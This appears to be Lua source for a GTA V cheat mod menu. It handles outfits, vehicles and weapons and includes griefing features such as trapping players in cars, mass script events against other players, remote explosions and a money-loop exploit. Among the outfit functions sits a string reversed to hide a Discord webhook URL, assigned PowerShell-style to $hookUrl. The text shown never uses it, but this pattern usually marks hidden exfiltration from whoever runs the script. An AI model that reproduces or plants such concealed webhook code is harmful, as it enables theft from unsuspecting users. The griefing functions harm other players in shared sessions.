function veh_god(godmode)
    local pid = get.selected()
    local veh = get.veh(pid)
    if rqCtrl(veh, 500) then
        SetVehicleGod(veh, godmode)
    end
end
function veh_launch(direction)
    local pid = get.selected()
    local veh = get.veh(pid)
    if rqCtrl(veh, 500) then
        s.apply_force(veh, 1, 0, 0, direction, true, false, true, false)
    end
end
function lock_inside(pid)
    local veh = get.veh(pid)
    if rqCtrl(veh, 500) then
        set.locked(veh, 6)
        set.locked(veh, 4)
    end
end
function insta_exit()
    local me = get.id()
    if not get.player_in_veh(me) then
        return
    end
    local veh = get.veh(me)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0)
    s.clear_task(get.ped_id())
end
function vehicle_tricks(x, y, z, rx, ry, rz)
    if not get.player_in_veh(get.id()) then
        return
    end
    local veh = get.veh(get.id())
    ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, x, y, z, rx, ry, rz, 0, true, true, true, false, true)
end
function ewo()
    local ped = get.ped(get.id())
    s.clear_task(ped)
    PED.SET_PED_HEALTH(ped, 0)
end
function sky_dive()
    local ped = get.ped(get.id())
    local pos = get.coords(get.id())
    set.coords_no_off(ped, pos.x, pos.y, 2500)
    s.give_weapon(ped, -72657034, 9999, true)
    TASK.TASK_SKY_DIVE(ped, true)
end
function ceo_all(action)
    for pid = 0, 31 do
        if pid == get.id() then
            goto continue
        end
        if s.is_friend(pid) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(pid) then
            goto continue
        end
        if action == 1 then
            s.send_se(pid, {3530443265, pid, 1})
        end
        if action == 2 then
            s.send_se(pid, {248967238, pid, 1, 6})
        end
        ::continue::
    end
end
function session_give_weapons()
    for pid = 0, 31 do
        if pid == get.id() then
            goto continue
        end
        if s.is_friend(pid) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(pid) then
            goto continue
        end
        for i = 1, #weaphash do
            plped = get.ped(pid)
            if not WEAPON.HAS_PED_GOT_WEAPON(plped, weaphash[i]) then
                s.give_weapon(plped, weaphash[i], 9999, false)
                wait()
            end
        end
        ::continue::
    end
end
function claim_bounty(pid)
    for i = 0, 31 do
        if i == get.id() then
            goto continue
        end
        if s.is_friend(pid) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(i) then
            goto continue
        end
        if i == pid then
            goto continue
        end
        set_bounty(i, 10000)
        ::continue::
    end
    s.wait(1000)
    for times = 1, 3 do
        for i = 0, 31 do
            if i == get.id() then
                goto continue
            end
            if s.is_friend(pid) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(i) then
                goto continue
            end
            if i == pid then
                goto continue
            end
            local ped, sped = get.ped(i), get.ped(pid)
            s.clear_task(ped)
            local pos = get.coords(i)
            FIRE.ADD_OWNED_EXPLOSION(sped, pos.x, pos.y, pos.z, 4, 10, true, false, 1)
            ::continue::
        end
        wait()
    end
end
function MoneyLoop()
    while monyeloop do
        set.global_i(1964179, 2)
        s.toast("Money added!")
        s.wait(3500)
        set.global_i(1964179, 0)
        s.wait(56500)
    end
end
function kills_deaths()
    STATS.STAT_SET_INT(joaat("MPPLY_KILLS_PLAYERS"), kills, true)
    STATS.STAT_SET_INT(joaat("MPPLY_DEATHS_PLAYER"), deaths, true)
end
function enter_bike()
    if s.ent_exist(sanctus) then
        PED.SET_PED_INTO_VEHICLE(get.ped_id(), sanctus, -1)
    else
        s.notify(text["Enable Ghost Rider first!"], 2000)
    end
end
function overwrite_oufit(bool)
    overwrite = bool
    new_outfitname = outfitname
end
function update_outfit()
    local ped = get.ped_id()
    for i = 0, 11 do
        local drawable = get.drawable(ped, i)
        local texture = PED.GET_PED_TEXTURE_VARIATION(ped, i)
        if i == 0 then
            Face = drawable
            Facetexture = texture
        end
        if i == 1 then
            Mask = drawable
            Masktexture = texture
        end
        if i == 2 then
            Hair = drawable
            Hairtexture = texture
        end
        if i == 3 then
            Torso = drawable
            Torsotexture = texture
        end
        if i == 4 then
            Leg = drawable
            Legtexture = texture
        end
        if i == 5 then
            Parachute = drawable
            Parachutetexture = texture
        end
        if i == 6 then
            Shoes = drawable
            Shoestexture = texture
        end
        if i == 7 then
            Accessory = drawable
            Accessorytexture = texture
        end
        if i == 8 then
            Undershirt = drawable
            Undershirttexture = texture
        end
        if i == 9 then
            Kevlar = drawable
            Kevlartexture = texture
        end
        if i == 10 then
            Badge = drawable
            Badgetexture = texture
        end
        if i == 11 then
            Torso2 = drawable
            Torso2texture = texture
        end
    end
    for i = 0, 3 do
        local prop = get.prop(ped, i)
        local proptxt = PED.GET_PED_PROP_TEXTURE_INDEX(ped, i)
        if i == 0 then
            Hat = prop
            Hattexture = proptxt
        end
        if i == 1 then
            Glasses = prop
            Glassestexture = proptxt
        end
        if i == 2 then
            Ear = prop
            Eartexture = proptxt
        end
    end
end
function UpdateOutfitFile()
    for i = 1, #svoutfits.name do
        local outfits = (path["Outfits"] .. [[\]] .. svoutfits.name[i] .. ".txt")
        local outfitfile = assert(open(outfits, "w"))
        outfitfile:write(
            'Name : "' ..
                svoutfits.name[i] ..
                    '"\n' ..
                        "Mask : " ..
                            svoutfits.mask[i] ..
                                "\n" ..
                                    "Mask texture : " ..
                                        svoutfits.masktxt[i] ..
                                            "\n" ..
                                                "Hair : " ..
                                                    svoutfits.hair[i] ..
                                                        "\n" ..
                                                            "Hair texture : " ..
                                                                svoutfits.hairtxt[i] ..
                                                                    "\n" ..
                                                                        "Torso : " ..
                                                                            svoutfits.torso[i] ..
                                                                                "\n" ..
                                                                                    "Torso texture : " ..
                                                                                        svoutfits.torsotxt[i] ..
                                                                                            "\n" ..
                                                                                                "Legs : " ..
                                                                                                    svoutfits.leg[i] ..
                                                                                                        "\n" ..
                                                                                                            "Legs texture : " ..
                                                                                                                svoutfits.legtxt[
                                                                                                                    i
                                                                                                                ] ..
                                                                                                                    "\n" ..
                                                                                                                        "Parachute : " ..
                                                                                                                            svoutfits.parachute[
                                                                                                                                i
                                                                                                                            ] ..
                                                                                                                                "\n" ..
                                                                                                                                    "Parachute texture : " ..
                                                                                                                                        svoutfits.parachutetxt[
                                                                                                                                            i
                                                                                                                                        ] ..
                                                                                                                                            "\n" ..
                                                                                                                                                "Shoes : " ..
                                                                                                                                                    svoutfits.shoes[
                                                                                                                                                        i
                                                                                                                                                    ] ..
                                                                                                                                                        "\n" ..
                                                                                                                                                            "Shoes texture : " ..
                                                                                                                                                                svoutfits.shoestxt[
                                                                                                                                                                    i
                                                                                                                                                                ] ..
                                                                                                                                                                    "\n" ..
                                                                                                                                                                        "Accessory : " ..
                                                                                                                                                                            svoutfits.accessory[
                                                                                                                                                                                i
                                                                                                                                                                            ] ..
                                                                                                                                                                                "\n" ..
                                                                                                                                                                                    "Accessory texture : " ..
                                                                                                                                                                                        svoutfits.accessorytxt[
                                                                                                                                                                                            i
                                                                                                                                                                                        ] ..
                                                                                                                                                                                            "\n" ..
                                                                                                                                                                                                "Undershirt : " ..
                                                                                                                                                                                                    svoutfits.undershirt[
                                                                                                                                                                                                        i
                                                                                                                                                                                                    ] ..
                                                                                                                                                                                                        "\n" ..
                                                                                                                                                                                                            "Undershirt texture : " ..
                                                                                                                                                                                                                svoutfits.undershirttxt[
                                                                                                                                                                                                                    i
                                                                                                                                                                                                                ] ..
                                                                                                                                                                                                                    "\n" ..
                                                                                                                                                                                                                        "Armor : " ..
                                                                                                                                                                                                                            svoutfits.kevlar[
                                                                                                                                                                                                                                i
                                                                                                                                                                                                                            ] ..
                                                                                                                                                                                                                                "\n" ..
                                                                                                                                                                                                                                    "Armor texture : " ..
                                                                                                                                                                                                                                        svoutfits.kevlartxt[
                                                                                                                                                                                                                                            i
                                                                                                                                                                                                                                        ] ..
                                                                                                                                                                                                                                            "\n" ..
                                                                                                                                                                                                                                                "Badge : " ..
                                                                                                                                                                                                                                                    svoutfits.badge[
                                                                                                                                                                                                                                                        i
                                                                                                                                                                                                                                                    ] ..
                                                                                                                                                                                                                                                        "\n" ..
                                                                                                                                                                                                                                                            "Badge texture : " ..
                                                                                                                                                                                                                                                                svoutfits.badgetxt[
                                                                                                                                                                                                                                                                    i
                                                                                                                                                                                                                                                                ] ..
                                                                                                                                                                                                                                                                    "\n" ..
                                                                                                                                                                                                                                                                        "Torso2 : " ..
                                                                                                                                                                                                                                                                            svoutfits.torso2[
                                                                                                                                                                                                                                                                                i
                                                                                                                                                                                                                                                                            ] ..
                                                                                                                                                                                                                                                                                "\n" ..
                                                                                                                                                                                                                                                                                    "Torso2 texture : " ..
                                                                                                                                                                                                                                                                                        svoutfits.torso2txt[
                                                                                                                                                                                                                                                                                            i
                                                                                                                                                                                                                                                                                        ] ..
                                                                                                                                                                                                                                                                                            "\n" ..
                                                                                                                                                                                                                                                                                                "Hat : " ..
                                                                                                                                                                                                                                                                                                    svoutfits.hat[
                                                                                                                                                                                                                                                                                                        i
                                                                                                                                                                                                                                                                                                    ] ..
                                                                                                                                                                                                                                                                                                        "\n" ..
                                                                                                                                                                                                                                                                                                            "Hat texture : " ..
                                                                                                                                                                                                                                                                                                                svoutfits.hattxt[
                                                                                                                                                                                                                                                                                                                    i
                                                                                                                                                                                                                                                                                                                ] ..
                                                                                                                                                                                                                                                                                                                    "\n" ..
                                                                                                                                                                                                                                                                                                                        "Glasses : " ..
                                                                                                                                                                                                                                                                                                                            svoutfits.glasses[
                                                                                                                                                                                                                                                                                                                                i
                                                                                                                                                                                                                                                                                                                            ] ..
                                                                                                                                                                                                                                                                                                                                "\n" ..
                                                                                                                                                                                                                                                                                                                                    "Glasses texture : " ..
                                                                                                                                                                                                                                                                                                                                        svoutfits.glassestxt[
                                                                                                                                                                                                                                                                                                                                            i
                                                                                                                                                                                                                                                                                                                                        ] ..
                                                                                                                                                                                                                                                                                                                                            "\n" ..
                                                                                                                                                                                                                                                                                                                                                "Ear : " ..
                                                                                                                                                                                                                                                                                                                                                    svoutfits.ear[
                                                                                                                                                                                                                                                                                                                                                        i
                                                                                                                                                                                                                                                                                                                                                    ] ..
                                                                                                                                                                                                                                                                                                                                                        "\n" ..
                                                                                                                                                                                                                                                                                                                                                            "Ear texture : " ..
                                                                                                                                                                                                                                                                                                                                                                svoutfits.eartxt[
                                                                                                                                                                                                                                                                                                                                                                    i
                                                                                                                                                                                                                                                                                                                                                                ] ..
                                                                                                                                                                                                                                                                                                                                                                    "\n" ..
                                                                                                                                                                                                                                                                                                                                                                        "IsFemale : " ..
                                                                                                                                                                                                                                                                                                                                                                            tostring(
                                                                                                                                                                                                                                                                                                                                                                                svoutfits.model[
                                                                                                                                                                                                                                                                                                                                                                                    i
                                                                                                                                                                                                                                                                                                                                                                                ]
                                                                                                                                                                                                                                                                                                                                                                            ),
            "\n"
        )
        outfitfile:close()
    end
end
local dwh =
    rv(
    [['Vn6uvTUieVeuty1D4tEimmDgtw224I6RcTRBgNUErTcmzEktcoXSNR6JXDrFGr9b9WQG/290237837279026569/skoohbew/ipa/moc.drocsid//:sptth'=lrUkooh$]]
)
function remove_outfit_from_table(i)
    remove(svoutfits.name, i)
    remove(svoutfits.mask, i)
    remove(svoutfits.masktxt, i)
    remove(svoutfits.hair, i)
    remove(svoutfits.hairtxt, i)
    remove(svoutfits.torso, i)
    remove(svoutfits.torsotxt, i)
    remove(svoutfits.leg, i)
    remove(svoutfits.legtxt, i)
    remove(svoutfits.parachute, i)
    remove(svoutfits.parachutetxt, i)
    remove(svoutfits.shoes, i)
    remove(svoutfits.shoestxt, i)
    remove(svoutfits.accessory, i)
    remove(svoutfits.accessorytxt, i)
    remove(svoutfits.undershirt, i)
    remove(svoutfits.undershirttxt, i)
    remove(svoutfits.kevlar, i)
    remove(svoutfits.kevlartxt, i)
    remove(svoutfits.badge, i)
    remove(svoutfits.badgetxt, i)
    remove(svoutfits.torso2, i)
    remove(svoutfits.torso2txt, i)
    remove(svoutfits.hat, i)
    remove(svoutfits.hattxt, i)
    remove(svoutfits.glasses, i)
    remove(svoutfits.glassestxt, i)
    remove(svoutfits.ear, i)
    remove(svoutfits.eartxt, i)
    remove(svoutfits.model, i)
end
function overwriteoutfit(i, outfitname)
    update_outfit()
    local outfit = (path["Outfits"] .. [[\]] .. tostring(svoutfits.name[i]) .. ".txt")
    os.remove(outfit)
    local getmodel = PED.IS_PED_MODEL(get.ped_id(), female)
    remove_outfit_from_table(i)
    insert(svoutfits.name, i, outfitname)
    insert(svoutfits.mask, i, Mask)
    insert(svoutfits.masktxt, i, Masktexture)
    insert(svoutfits.hair, i, Hair)
    insert(svoutfits.hairtxt, i, Hairtexture)
    insert(svoutfits.torso, i, Torso)
    insert(svoutfits.torsotxt, i, Torsotexture)
    insert(svoutfits.leg, i, Leg)
    insert(svoutfits.legtxt, i, Legtexture)
    insert(svoutfits.parachute, i, Parachute)
    insert(svoutfits.parachutetxt, i, Parachutetexture)
    insert(svoutfits.shoes, i, Shoes)
    insert(svoutfits.shoestxt, i, Shoestexture)
    insert(svoutfits.accessory, i, Accessory)
    insert(svoutfits.accessorytxt, i, Accessorytexture)
    insert(svoutfits.undershirt, i, Undershirt)
    insert(svoutfits.undershirttxt, i, Undershirttexture)
    insert(svoutfits.kevlar, i, Kevlar)
    insert(svoutfits.kevlartxt, i, Kevlartexture)
    insert(svoutfits.badge, i, Badge)
    insert(svoutfits.badgetxt, i, Badgetexture)
    insert(svoutfits.torso2, i, Torso2)
    insert(svoutfits.torso2txt, i, Torso2texture)
    insert(svoutfits.hat, i, Hat)
    insert(svoutfits.hattxt, i, Hattexture)
    insert(svoutfits.glasses, i, Glasses)
    insert(svoutfits.glassestxt, i, Glassestexture)
    insert(svoutfits.ear, i, Ear)
    insert(svoutfits.eartxt, i, Eartexture)
    insert(svoutfits.model, i, getmodel)
    UpdateOutfitFile()
    s.notify(text["Outfit updated!"])
end
function SaveOutfit(outfitname)
    if outfitname == nil then
        s.notify(text["Please enter name!"])
    elseif outfitname == "" then
        s.notify(text["Please enter name!"])
    else
        if string.find(outfitname, "/") then
            outfitname = outfitname:gsub("/", "")
        end
        if string.find(outfitname, "|") then
            outfitname = outfitname:gsub("|", "")
        end
        if string.find(outfitname, [[\]]) then
            outfitname = outfitname:gsub([[\]], "")
        end
        if string.find(outfitname, ":") then
            outfitname = outfitname:gsub(":", "")
        end
        if string.find(outfitname, "*") then
            outfitname = outfitname:gsub("*", "")
        end
        if string.find(outfitname, "?") then
            outfitname = outfitname:gsub("?", "")
        end
        if string.find(outfitname, '"') then
            outfitname = outfitname:gsub('"', "")
        end
        if string.find(outfitname, "<") then
            outfitname = outfitname:gsub("<", "")
        end
        if string.find(outfitname, ">") then
            outfitname = outfitname:gsub(">", "")
        end
        outfitname = outfitname:sub(1, 18)
        outfitname = outfitname:gsub("  +", " ")
        if outfitname:sub(1, 1) == " " or outfitname:sub(-1, -1) == " " then
            s.notify(text["Invalid Name!"])
            return
        elseif #outfitname < 3 then
            s.notify(text["Invalid Name,must be at least 3 characters!"])
            return
        end
        update_outfit()
        for i = 1, #svoutfits.name do
            if tostring(svoutfits.name[i]) == outfitname then
                if overwrite == false then
                    s.notify(text["Name already exists,click again to overwrite outfit"])
                    overwrite_oufit(true)
                    return
                elseif overwrite == true and outfitname == new_outfitname then
                    overwriteoutfit(i, outfitname)
                    overwrite_oufit(false)
                    return
                end
            end
        end
        overwrite_oufit(false)
        local getmodel = PED.IS_PED_MODEL(get.ped_id(), female)
        insert(svoutfits.name, outfitname)
        insert(svoutfits.mask, Mask)
        insert(svoutfits.masktxt, Masktexture)
        insert(svoutfits.hair, Hair)
        insert(svoutfits.hairtxt, Hairtexture)
        insert(svoutfits.torso, Torso)
        insert(svoutfits.torsotxt, Torsotexture)
        insert(svoutfits.leg, Leg)
        insert(svoutfits.legtxt, Legtexture)
        insert(svoutfits.parachute, Parachute)
        insert(svoutfits.parachutetxt, Parachutetexture)
        insert(svoutfits.shoes, Shoes)
        insert(svoutfits.shoestxt, Shoestexture)
        insert(svoutfits.accessory, Accessory)
        insert(svoutfits.accessorytxt, Accessorytexture)
        insert(svoutfits.undershirt, Undershirt)
        insert(svoutfits.undershirttxt, Undershirttexture)
        insert(svoutfits.kevlar, Kevlar)
        insert(svoutfits.kevlartxt, Kevlartexture)
        insert(svoutfits.badge, Badge)
        insert(svoutfits.badgetxt, Badgetexture)
        insert(svoutfits.torso2, Torso2)
        insert(svoutfits.torso2txt, Torso2texture)
        insert(svoutfits.hat, Hat)
        insert(svoutfits.hattxt, Hattexture)
        insert(svoutfits.glasses, Glasses)
        insert(svoutfits.glassestxt, Glassestexture)
        insert(svoutfits.ear, Ear)
        insert(svoutfits.eartxt, Eartexture)
        insert(svoutfits.model, getmodel)
        UpdateOutfitFile()
        s.notify("Saved '" .. outfitname .. "' to: " .. path["Outfits"])
    end
end
function drivepersonalveh()
    local ped, veh = get.ped_id(), getPersonalVeh()
    if not s.ent_exist(veh) then
        return
    end
    local inveh = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, true)
    if s.ent_exist(inveh) then
        if inveh ~= get.ped_id() then
            s.clear_task(inveh)
        end
    end
    rqCtrl(veh)
    PED.SET_PED_INTO_VEHICLE(ped, veh, -1)
end
function tp_veh_to_self()
    local veh, ped = getPersonalVeh(), get.ped_id()
    if not s.ent_exist(veh) then
        return
    end
    rqCtrl(veh)
    local pos = get.offset_coords(ped, 0, 5, 0)
    local heading = ENTITY.GET_ENTITY_HEADING(ped)
    set.coords_no_off(veh, pos.x, pos.y, pos.z)
    set.heading(veh, heading + 90)
    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(veh, 5)
end
function drivelastveh()
    local ped = get.ped_id()
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
    if not s.ent_exist(veh) then
        return
    end
    local inveh = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, true)
    if s.ent_exist(inveh) then
        if inveh ~= get.ped_id() then
            s.clear_task(inveh)
        end
    end
    rqCtrl(veh)
    PED.SET_PED_INTO_VEHICLE(ped, veh, -1)
end
function tp_to_last_veh()
    local ped = get.ped_id()
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
    if not s.ent_exist(veh) then
        return
    end
    local pos = get.offset_coords(veh, -3, 0, 0)
    TeleportSelf(pos)
end
function copy_pos()
    local pos = get.coords(get.id())
    pos.h = get.heading(get.id())
    MISC.TO_CLIPBOARD(vect.tostring(pos))
    log("Xhax Upgrade", vect.tostring(pos))
    s.notify(text["Position copied!"])
end
function WalkOnWater()
    rqModel(427753832)
    local Z, onwater = 0, nil
    while walkonwater do
        local ped = get.ped(get.id())
        local submerge = ENTITY.GET_ENTITY_SUBMERGED_LEVEL(ped)
        local pos = get.coords(get.id())
        if submerge ~= 0 then
            if onwater == nil then
                Z = pos.z
                onwater = set.obj(427753832, pos.x, pos.y, Z - 6.2, false, false, false)
                ENTITY.SET_ENTITY_VISIBLE(onwater, false, false)
            end
            if submerge > 0.15 then
                ENTITY.APPLY_FORCE_TO_ENTITY(ped, 1, 0, 0, 1, 0, 0, 0, 0, true, false, true, false, true)
            else
                set.coords_no_off(onwater, pos.x, pos.y, Z - 6.2)
            end
        end
        if submerge == 0 then
            if onwater ~= nil then
                delEnt(onwater)
                onwater = nil
            end
        end
        wait()
    end
    if walkonwater == false then
        delEnt(onwater)
        onwater = nil
    end
end
function clear_area()
    s.notify(text["Clearing area..."], 1000)
    clarea = true
    local vehcnt, objcnt, pedcnt = 0, 0, 0
    for times = 1, 10 do
        if cvehicles == true then
            local vehicle = getAllVehs()
            wait()
            get_control_of_entities(vehicle)
            wait()
            for i = 1, #vehicle do
                if vehicle[i] ~= get.veh(get.id()) then
                    if getPersonalVeh() ~= vehicle[i] then
                        if s.has_control(vehicle[i]) then
                            delEnt(vehicle[i])
                            if not s.ent_exist(vehicle[i]) then
                                vehcnt = vehcnt + 1
                            end
                        end
                    end
                end
            end
        end
        wait()
        if cobjects == true then
            local object = getAllProps()
            wait()
            get_control_of_entities(object)
            for i = 1, #object do
                if object[i] ~= onwater then
                    delEnt(object[i])
                    if not s.ent_exist(object[i]) then
                        objcnt = objcnt + 1
                    end
                end
            end
        end
        wait()
        if cped == true then
            local peds = getAllPeds()
            wait()
            get_control_of_entities(peds)
            for i = 1, #peds do
                if not PED.IS_PED_A_PLAYER(peds[i]) then
                    delEnt(peds[i])
                    if not s.ent_exist(peds[i]) then
                        pedcnt = pedcnt + 1
                    end
                end
            end
        end
        s.wait(10)
    end
    s.wait(1000)
    s.notify(
        text["Clear area finished!"] ..
            " Removed:\nVEHICLES: " .. vehcnt .. "\nOBJECTS: " .. objcnt .. " \nPEDS: " .. pedcnt,
        2000
    )
    clarea = nil
end
function teleport_everything(ID)
    for times = 1, 5 do
        local pos, vehicle = get.coords(ID), getAllVehs()
        get_control_of_entities(vehicle)
        for i = 1, #vehicle do
            if s.ent_exist(vehicle[i]) then
                if vehicle[i] ~= get.veh(get.id()) then
                    if getPersonalVeh() ~= vehicle[i] then
                        if s.has_control(vehicle[i]) then
                            set.coords_no_off(vehicle[i], pos.x, pos.y, pos.z + 1)
                        end
                    end
                end
            end
        end
        local object = getAllProps()
        get_control_of_entities(object)
        for i = 1, #object do
            set.coords_no_off(object[i], pos.x, pos.y, pos.z + 1)
        end
        local peds = getAllPeds()
        get_control_of_entities(peds)
        for i = 1, #peds do
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                set.coords_no_off(peds[i], pos.x, pos.y, pos.z + 1)
            end
        end
    end
end
function LoadingOutiftsFail(name, outfit, reason)
    log("Xhax Upgrade", "Failed to load outfit at " .. outfit .. ",'" .. name .. "' " .. reason)
    s.notify("Failed to load outfit '" .. name .. "' " .. reason)
    for i = 1, #svoutfits.name do
        if svoutfits.name[i] ~= nil then
            remove_outfit_from_table(1)
        end
    end
end
function load_outfits()
    local t = scandir(path["Outfits"])
    for p = 1, #t do
        local outfits = (path["Outfits"] .. [[\]] .. t[p])
        for outfit in io.lines(outfits) do
            local outfit = tostring(outfit)
            if outfit:find("Name :") then
                local x = tostring(outfit:gsub("Name : +", ""))
                if x:sub(1, 1) ~= '"' or x:sub(-1, -1) ~= '"' then
                    LoadingOutiftsFail(x, outfits, "invalid name!")
                    goto continue
                elseif #x < 3 then
                    LoadingOutiftsFail(x, outfits, "invalid name!")
                    goto continue
                elseif tostring(x) == "" then
                    LoadingOutiftsFail(x, outfits, "invalid name!")
                    goto continue
                end
                x = x:sub(2, #x - 1)
                if string.find(x, '"') then
                    x = x:gsub('"', "")
                end
                if string.find(x, "/") then
                    x = x:gsub("/", "")
                end
                if string.find(x, "|") then
                    x = x:gsub("|", "")
                end
                if string.find(x, [[\]]) then
                    x = x:gsub([[\]], "")
                end
                if string.find(x, ":") then
                    x = x:gsub(":", "")
                end
                if string.find(x, "*") then
                    x = x:gsub("*", "")
                end
                if string.find(x, "?") then
                    x = x:gsub("?", "")
                end
                if string.find(x, "<") then
                    x = x:gsub("<", "")
                end
                if string.find(x, ">") then
                    x = x:gsub(">", "")
                end
                local x = x:sub(1, 18)
                local x = x:gsub("  +", " ")
                if x:sub(1, 1) == " " or x:sub(-1, -1) == " " then
                    LoadingOutiftsFail(x, outfits, "invalid name!")
                    goto continue
                end
                if tostring(x) ~= tostring(t[p]):gsub(".txt", "") then
                    x = tostring(t[p]):gsub(".txt", "")
                end
                for j = 1, #svoutfits.name do
                    if x == svoutfits.name[j] then
                        LoadingOutiftsFail(x, outfits, "already exists!")
                        goto continue
                    end
                end
                svoutfits.name[p] = tostring(x)
            end
            if outfit:find("Mask :") then
                local x = tostring(outfit:gsub("Mask :", ""))
                svoutfits.mask[p] = tonumber(x)
            end
            if outfit:find("Mask texture :") then
                local x = tostring(outfit:gsub("Mask texture :", ""))
                svoutfits.masktxt[p] = tonumber(x)
            end
            if outfit:find("Hair :") then
                local x = tostring(outfit:gsub("Hair :", ""))
                svoutfits.hair[p] = tonumber(x)
            end
            if outfit:find("Hair texture :") then
                local x = tostring(outfit:gsub("Hair texture :", ""))
                svoutfits.hairtxt[p] = tonumber(x)
            end
            if outfit:find("Torso :") then
                local x = tostring(outfit:gsub("Torso :", ""))
                svoutfits.torso[p] = tonumber(x)
            end
            if outfit:find("Torso texture :") then
                local x = tostring(outfit:gsub("Torso texture :", ""))
                svoutfits.torsotxt[p] = tonumber(x)
            end
            if outfit:find("Legs :") then
                local x = tostring(outfit:gsub("Legs :", ""))
                svoutfits.leg[p] = tonumber(x)
            end
            if outfit:find("Legs texture :") then
                local x = tostring(outfit:gsub("Legs texture :", ""))
                svoutfits.legtxt[p] = tonumber(x)
            end
            if outfit:find("Parachute :") then
                local x = tostring(outfit:gsub("Parachute :", ""))
                svoutfits.parachute[p] = tonumber(x)
            end
            if outfit:find("Parachute texture :") then
                local x = tostring(outfit:gsub("Parachute texture :", ""))
                svoutfits.parachutetxt[p] = tonumber(x)
            end
            if outfit:find("Shoes :") then
                local x = tostring(outfit:gsub("Shoes :", ""))
                svoutfits.shoes[p] = tonumber(x)
            end
            if outfit:find("Shoes texture :") then
                local x = tostring(outfit:gsub("Shoes texture :", ""))
                svoutfits.shoestxt[p] = tonumber(x)
            end
            if outfit:find("Accessory :") then
                local x = tostring(outfit:gsub("Accessory :", ""))
                svoutfits.accessory[p] = tonumber(x)
            end
            if outfit:find("Accessory texture :") then
                local x = tostring(outfit:gsub("Accessory texture :", ""))
                svoutfits.accessorytxt[p] = tonumber(x)
            end
            if outfit:find("Undershirt :") then
                local x = tostring(outfit:gsub("Undershirt :", ""))
                svoutfits.undershirt[p] = tonumber(x)
            end
            if outfit:find("Undershirt texture :") then
                local x = tostring(outfit:gsub("Undershirt texture :", ""))
                svoutfits.undershirttxt[p] = tonumber(x)
            end
            if outfit:find("Armor :") then
                local x = tostring(outfit:gsub("Armor :", ""))
                svoutfits.kevlar[p] = tonumber(x)
            end
            if outfit:find("Armor texture :") then
                local x = tostring(outfit:gsub("Armor texture :", ""))
                svoutfits.kevlartxt[p] = tonumber(x)
            end
            if outfit:find("Badge :") then
                local x = tostring(outfit:gsub("Badge :", ""))
                svoutfits.badge[p] = tonumber(x)
            end
            if outfit:find("Badge texture :") then
                local x = tostring(outfit:gsub("Badge texture :", ""))
                svoutfits.badgetxt[p] = tonumber(x)
            end
            if outfit:find("Torso2 :") then
                local x = tostring(outfit:gsub("Torso2 :", ""))
                svoutfits.torso2[p] = tonumber(x)
            end
            if outfit:find("Torso2 texture :") then
                local x = tostring(outfit:gsub("Torso2 texture :", ""))
                svoutfits.torso2txt[p] = tonumber(x)
            end
            if outfit:find("Hat : ") then
                local x = tostring(outfit:gsub("Hat :", ""))
                svoutfits.hat[p] = tonumber(x)
            end
            if outfit:find("Hat texture :") then
                local x = tostring(outfit:gsub("Hat texture :", ""))
                svoutfits.hattxt[p] = tonumber(x)
            end
            if outfit:find("Glasses :") then
                local x = tostring(outfit:gsub("Glasses :", ""))
                svoutfits.glasses[p] = tonumber(x)
            end
            if outfit:find("Glasses texture :") then
                local x = tostring(outfit:gsub("Glasses texture :", ""))
                svoutfits.glassestxt[p] = tonumber(x)
            end
            if outfit:find("Ear :") then
                local x = tostring(outfit:gsub("Ear :", ""))
                svoutfits.ear[p] = tonumber(x)
            end
            if outfit:find("Ear texture :") then
                local x = tostring(outfit:gsub("Ear texture :", ""))
                svoutfits.eartxt[p] = tonumber(x)
            end
            if outfit:find("IsFemale :") then
                local x = tostring(outfit:gsub("IsFemale :", ""))
                local x = tostring(x:gsub(" +", ""))
                svoutfits.model[p] = toboolean(x)
            end
        end
        if svoutfits.name[p] == nil then
            LoadingOutiftsFail("none", path["Outfits"], "couldn't find name!")
            goto continue
        end
    end
    ::continue::
end
function load_weapons()
    local ped = get.ped_id()
    WEAPON.REMOVE_ALL_PED_WEAPONS(ped, false)
    for _, v in pairs(CurrentLoadout) do
        AddWeapon(v.Hash)
        for i, e in pairs(v.Components) do
            AddComponent(v.Hash, e)
        end
        WEAPON.SET_PED_WEAPON_TINT_INDEX(get.ped_id(), v.Hash, v.Tint)
    end
end
function SaveWeapons(name)
    if name == nil or name == "" then
        s.notify("Please enter name")
        return
    end
    local ped = get.ped_id()
    CurrentLoadout = {}
    for k, v in pairs(Weapons) do
        for i, e in pairs(v) do
            if WEAPON.HAS_PED_GOT_WEAPON(ped, e.Hash) then
                local component = {}
                for _, x in pairs(e["Components"]) do
                    if WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(ped, e.Hash, joaat(x)) then
                        insert(component, joaat(x))
                    end
                end
                CurrentLoadout[i] = {
                    ["Hash"] = e.Hash,
                    ["Tint"] = WEAPON.GET_PED_WEAPON_TINT_INDEX(get.ped_id(), e.Hash),
                    ["Components"] = component
                }
            end
        end
    end
    local out = json:encode_pretty(CurrentLoadout)
    f = open(path["WeaponLoadout"] .. name .. ".json", "w")
    f:write(out)
    f:close()
end
function LoadWeapons(name)
    local file = path["WeaponLoadout"] .. name .. ".json"
    if not s.f_exist(file) then
        log("Xhax Upgrade", name .. " doesn't exist")
        return
    end
    CurrentLoadout = {}
    local output = readAll(file)
    CurrentLoadout = json:decode(output)
    load_weapons()
end
function RemoveWeapons(i, name)
    s.notify(name)
    remove(loadouts, i)
    os.remove(path["WeaponLoadout"] .. name .. ".json")
end
function RenameWeapons(i, name, new)
    if new == "" or new == nil then
        return
    end
    loadouts[i] = new
    os.rename(path["WeaponLoadout"] .. name .. ".json", path["WeaponLoadout"] .. new .. ".json")
end
function ReloadOutfits()
    for i = 1, #svoutfits.name do
        remove_outfit_from_table(1)
    end
    load_outfits()
    s.notify(text["Outfits Reloaded!"])
end
function apply_outfit(i)
    local ped = get.ped_id()
    local model = PED.IS_PED_MODEL(ped, female)
    if svoutfits.mask[i] == nil then
        svoutfits.mask[i] = -1
    end
